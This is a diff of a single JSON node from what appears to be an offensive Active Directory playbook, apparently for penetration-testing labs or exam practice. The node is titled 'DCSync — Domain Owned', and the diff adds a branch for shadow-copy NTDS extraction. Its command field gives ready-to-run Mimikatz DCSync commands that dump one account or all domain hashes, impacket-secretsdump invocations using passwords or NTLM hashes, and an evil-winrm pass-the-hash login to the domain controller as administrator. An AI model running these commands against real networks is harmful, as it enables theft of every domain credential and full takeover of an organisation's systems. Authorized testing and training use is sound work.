@@ -1,21 +1,25 @@
 {
   "id": "dcsync",
   "phase": "AD",
-  "title": "DCSync — Domain Owned",
-  "body": "DCSync dumps all domain hashes. You have replication rights — pull every account. This is game over for the domain.",
-  "cmd": "# Mimikatz DCSync (on Windows — no MSF)\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \\\n  \"exit\"\n\n# Dump all hashes\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /all /csv\" \\\n  \"exit\"\n\n# impacket-secretsdump (from Kali — no agent)\nimpacket-secretsdump domain/admin:'pass'@<DCIP>\nimpacket-secretsdump domain/admin@<DCIP> -hashes :NTLM_HASH\nimpacket-secretsdump domain/admin:'pass'@<DCIP> -just-dc-ntlm\n\n# PTH to DC as Administrator\nevil-winrm -i <DCIP> -u administrator -H <NTLM_HASH>",
+  "title": "DCSync \u2014 Domain Owned",
+  "body": "DCSync dumps all domain hashes. You have replication rights \u2014 pull every account. This is game over for the domain.",
+  "cmd": "# Mimikatz DCSync (on Windows \u2014 no MSF)\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \\\n  \"exit\"\n\n# Dump all hashes\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /all /csv\" \\\n  \"exit\"\n\n# impacket-secretsdump (from Kali \u2014 no agent)\nimpacket-secretsdump domain/admin:'pass'@<DCIP>\nimpacket-secretsdump domain/admin@<DCIP> -hashes :NTLM_HASH\nimpacket-secretsdump domain/admin:'pass'@<DCIP> -just-dc-ntlm\n\n# PTH to DC as Administrator\nevil-winrm -i <DCIP> -u administrator -H <NTLM_HASH>",
   "warn": null,
   "choices": [
     {
-      "label": "Got SPN hashes — forge silver tickets",
+      "label": "Got SPN hashes \u2014 forge silver tickets",
       "next": "silver_tickets"
     },
     {
-      "label": "Got krbtgt hash — golden tickets via lateral movement",
+      "label": "Got krbtgt hash \u2014 golden tickets via lateral movement",
       "next": "lateral_movement"
     },
     {
-      "label": "Domain Admin shell on DC — grab proof",
+      "label": "No DCSync rights \u2014 pull NTDS via shadow copy",
+      "next": "shadow_copy_ntds"
+    },
+    {
+      "label": "Domain Admin shell on DC \u2014 grab proof",
       "next": "ad_complete"
     }
   ]
